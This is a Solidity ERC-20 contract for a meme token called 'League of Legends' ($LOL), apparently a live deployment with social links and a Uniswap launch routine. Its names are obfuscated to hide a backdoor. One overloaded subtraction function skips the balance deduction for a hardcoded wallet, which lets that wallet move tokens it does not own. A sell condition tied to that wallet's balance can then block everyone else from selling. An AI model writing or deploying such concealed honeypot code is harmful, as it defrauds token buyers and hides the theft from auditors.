/*

League of Legends   $LOL


TWITTER: https://twitter.com/LOL_Ethereum
TELEGRAM: https://t.me/LOL_Ethereum
WEBSITE: https://lolerc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _efqjo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _efqjo(a, b, "SafeMath");
    }

    function  _efqjo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract LOL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Tvkrgmk;
    address payable private _ykicpje;
    address private _rjgcbu;

    string private constant _name = unicode"League of Legends";
    string private constant _symbol = unicode"LOL";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _acglhsr;
    mapping (address => bool) private _yrpiky;
    mapping(address => uint256) private _fneqfp;
    uint256 public _qvoldib = _totalSupply;
    uint256 public _eorpvie = _totalSupply;
    uint256 public _rkTjkur= _totalSupply;
    uint256 public _vadTetf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ysvquj=0;
    uint256 private _ejkrsy=0;
    

    bool private _bvuamh;
    bool public _urozebf = false;
    bool private pvobkre = false;
    bool private _oregyvu = false;


    event _hrpwytc(uint _qvoldib);
    modifier uivgolr {
        pvobkre = true;
        _;
        pvobkre = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _acglhsr[owner(

        )] = true;
        _acglhsr[address
        (this)] = true;
        _acglhsr[
            _ykicpje] = true;
        _ykicpje = 
        payable (0xF819577fE09BE0bb9d786F3ce28392d6A7A4A3c3);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _efqjo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 vjdkcr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_urozebf) {
                if (to 
                != address
                (_Tvkrgmk) 
                && to !=
                 address
                 (_rjgcbu)) {
                  require(_fneqfp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fneqfp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rjgcbu && to != 
            address(_Tvkrgmk) &&
             !_acglhsr[to] ) {
                require(amount 
                <= _qvoldib,
                 "Exceeds the _qvoldib.");
                require(balanceOf
                (to) + amount
                 <= _eorpvie,
                  "Exceeds the _eorpvie.");
                if(_ejkrsy
                < _ysvquj){
                  require
                  (! _rkpieyq(to));
                }
                _ejkrsy++;
                 _yrpiky
                 [to]=true;
                vjdkcr = amount._pvr
                ((_ejkrsy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rjgcbu &&
             from!= address(this) 
            && !_acglhsr[from] ){
                require(amount <= 
                _qvoldib && 
                balanceOf(_ykicpje)
                <_vadTetf,
                 "Exceeds the _qvoldib.");
                vjdkcr = amount._pvr((_ejkrsy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ejkrsy>
                _ysvquj &&
                 _yrpiky[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pvobkre 
            && to == _rjgcbu &&
             _oregyvu &&
             contractTokenBalance>
             _rkTjkur 
            && _ejkrsy>
            _ysvquj&&
             !_acglhsr[to]&&
              !_acglhsr[from]
            ) {
                _transferFrom( _wraef(amount, 
                _wraef(contractTokenBalance,
                _vadTetf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _piwxeo(address
                    (this).balance);
                }
            }
        }

        if(vjdkcr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(vjdkcr);
          emit
           Transfer(from,
           address
           (this),vjdkcr);
        }
        _balances[from
        ]= _efqjo(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _efqjo(vjdkcr));
        emit Transfer
        (from, to, 
        amount.
         _efqjo(vjdkcr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uivgolr {
        if(tokenAmount==
        0){return;}
        if(!_bvuamh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tvkrgmk.WETH();
        _approve(address(this),
         address(
             _Tvkrgmk), 
             tokenAmount);
        _Tvkrgmk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wraef
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _efqjo(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _ykicpje){
            return a ;
        }else{
            return a .
             _efqjo (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvoldib = _totalSupply;
        _eorpvie = _totalSupply;
        emit _hrpwytc(_totalSupply);
    }

    function _rkpieyq(address 
    account) private view 
    returns (bool) {
        uint256 edjevr;
        assembly {
            edjevr :=
             extcodesize
             (account)
        }
        return edjevr > 
        0;
    }

    function _piwxeo(uint256
    amount) private {
        _ykicpje.
        transfer(
            amount);
    }

    function openrTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bvuamh ) ;
        _Tvkrgmk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tvkrgmk), 
            _totalSupply);
        _rjgcbu = 
        IUniswapV2Factory(_Tvkrgmk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tvkrgmk .
             WETH ( ) );
        _Tvkrgmk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rjgcbu).
        approve(address(_Tvkrgmk), 
        type(uint)
        .max);
        _oregyvu = true;
        _bvuamh = true;
    }

    receive() external payable {}
}